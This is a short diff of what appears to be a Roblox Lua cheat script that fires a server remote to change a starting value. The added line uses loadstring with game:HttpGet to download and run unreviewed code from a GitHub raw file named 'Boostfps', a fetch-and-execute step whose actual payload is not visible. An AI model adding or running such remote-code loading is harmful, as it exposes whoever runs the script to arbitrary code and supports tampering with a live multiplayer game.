@@ -1,4 +1,5 @@
 repeat wait() until game:IsLoaded()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/feezaza123/bounty/main/Boostfps", true))()
 wait(2)
 game:GetService("ReplicatedStorage").remotes.changeStartValue:FireServer()
 local hum = game.Players.LocalPlayer.Character.Humanoid
